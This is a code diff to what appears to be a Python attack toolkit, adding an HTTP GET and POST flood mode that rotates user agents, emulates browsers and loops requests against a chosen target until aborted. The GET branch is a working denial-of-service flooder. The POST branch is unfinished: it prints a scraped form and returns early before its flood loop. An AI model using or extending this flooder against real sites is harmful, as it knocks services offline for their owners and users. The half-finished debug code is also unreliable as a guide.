@@ -10,9 +10,11 @@ from core import exceptions
 
 # Put all needed dependencies here!
 try:
+    import re
     import time
     import socket
     import requests
+    import traceback
     import subprocess
     from core import gethost
     from core import printer
@@ -20,6 +22,7 @@ try:
 
     import threading
     import queue
+    from bs4 import BeautifulSoup
     from scapy.all import get_if_raw_hwaddr, Ether, IP
     from scapy.all import UDP, RandString, DHCP, sendp
     from scapy.all import conf as confs
@@ -487,6 +490,8 @@ Please manually kill ettercap by typing `killall ettercap` in your terminal.", 1
                 print("[01] HTTP GET attack")
                 print("[02] HTTP POST attack")
                 print("[03] HTTP GET/POST attack")
+                print("\nNOTE: When using attacks with POST, URL must handle POSTS.")
+                print("Otherwise, it will not be effective. (Example: `http://localhost/target.php`)\n")
                 http_get_mode = False
                 http_post_mode = False
                 while True:
@@ -513,6 +518,9 @@ Please manually kill ettercap by typing `killall ettercap` in your terminal.", 1
                     
                 while True:
                     try:
+                        # https://kb.mazebolt.com/knowledgebase/https-flood-with-browser-emulation/
+                        # https://kb.mazebolt.com/knowledgebase/https-flood-with-browser-emulation/
+                        # Browse like a spider...
                         browser_emulation = input("Enable Browser Emulation? (y/n) > ")
                         if browser_emulation.lower() == 'y':
                             browser_emulation = True
@@ -528,31 +536,111 @@ Please manually kill ettercap by typing `killall ettercap` in your terminal.", 1
                         
                     except(ValueError, TypeError, EOFError, KeyboardInterrupt):
                         continue
+                    
+                headers = {"user-agent": ""}
+                with open("data/user_agents.txt", 'r') as ua:
+                    uas = ua.readlines()
+                
+                headers["user-agent"] = uas[random.randint(0, len(uas) - 1)].replace('\n', '')
+                
+                slashes = 0
+                for targ in values['target']:
+                    # print(slashes)  # DEV0005
+                    if targ == '/':
+                        slashes += 1
                         
+                    else:
+                        pass
+                    
                 while True:
-                    final_target = "{0}{1}:{2}".format(schema, values['target'], values['port'])
+                    if slashes == 2:
+                        final_target = "{0}{1}:{2}".format(schema, values['target'], values['port'])
+                        
+                    else:
+                        final_target = "{0}{1}:{2}/{3}".format(schema, values['target'].partition('/')[0], values['port'], values['target'].partition('/')[2])
+                        
+                    # print(final_target)
                     printer.Printer().print_with_status("Starting Attack...", 0)
                     printer.Printer().print_with_status("Press CTRL+C or CTRL+D to abort...", 1)
                     if http_get_mode is True and http_post_mode is False:
                         connection_stable = True
                         while True:
                             try:
-                                recv = requests.get(final_target)
+                                headers["user-agent"] = uas[random.randint(0, len(uas) - 1)].replace('\n', '')
+                                # print(headers["user-agent"])  # DEV0005
+                                try:
+                                    recv = requests.get(final_target, headers=headers)
+                                    
+                                except(requests.exceptions.ConnectionError):
+                                    printer.Printer().print_with_status("An existing connection was forcibly closed by the remote host. The host may be down.", 2)
+                                    connection_stable = False
+                                    continue
                                 
-                            except(requests.exceptions.ConnectionError):
-                                printer.Printer().print_with_status("An existing connection was forcibly closed by the remote host. The host may be down.", 2)
-                                connection_stable = False
-                                continue
-                            
+                                except(KeyboardInterrupt, EOFError):
+                                    printer.Printer().print_with_status("Aborting...", 1)
+                                    return 0
+                                
+                                else:
+                                    if connection_stable is False:
+                                        printer.Printer().print_with_status("We are now connected!", 0)
+                                    
+                                    connection_stable = True
+                                    
+                                finally:
+                                    time.sleep(values['timeout'])
+                                
                             except(KeyboardInterrupt, EOFError):
                                 printer.Printer().print_with_status("Aborting...", 1)
                                 return 0
-                            
-                            else:
-                                if connection_stable is False:
-                                    printer.Printer().print_with_status("We are now connected!", 0)
+
                                 
-                                connection_stable = True
+                    elif http_get_mode is False and http_post_mode is True:
+                        connection_stable = True
+                        headers["content-type"] = "form-data"
+                        
+                        # 1.Get page data
+                        # 2.Find form
+                        # 3.Flood POST
+                        try:
+                            resp = requests.get(final_target, headers=headers)
+                        
+                        except:
+                            traceback.print_exc()
+                            return 20
+                            
+                        soup = BeautifulSoup(resp.text, 'html.parser')
+                        form = soup.find(name='form', action=re.compile(r'OrgShortNm'))
+                        print(form, '\n', type(form))
+                        return 0
+                        payload = {}
+                        while True:
+                            try:
+                                headers["user-agent"] = uas[random.randint(0, len(uas) - 1)].replace('\n', '')
+                                # print(headers["user-agent"])  # DEV0005
+                                try:
+                                    recv = requests.post(final_target, headers=headers, data=payload)
+                                    
+                                except(requests.exceptions.ConnectionError):
+                                    printer.Printer().print_with_status("An existing connection was forcibly closed by the remote host. The host may be down.", 2)
+                                    connection_stable = False
+                                    continue
+                                
+                                except(KeyboardInterrupt, EOFError):
+                                    printer.Printer().print_with_status("Aborting...", 1)
+                                    return 0
+                                
+                                else:
+                                    if connection_stable is False:
+                                        printer.Printer().print_with_status("We are now connected!", 0)
+                                    
+                                    connection_stable = True
+                                    
+                                finally:
+                                    time.sleep(values['timeout'])
+                                
+                            except(KeyboardInterrupt, EOFError):
+                                printer.Printer().print_with_status("Aborting...", 1)
+                                return 0
                 
             else:
                 printer.Printer().print_with_status("Invalid attack_mode!", 2)
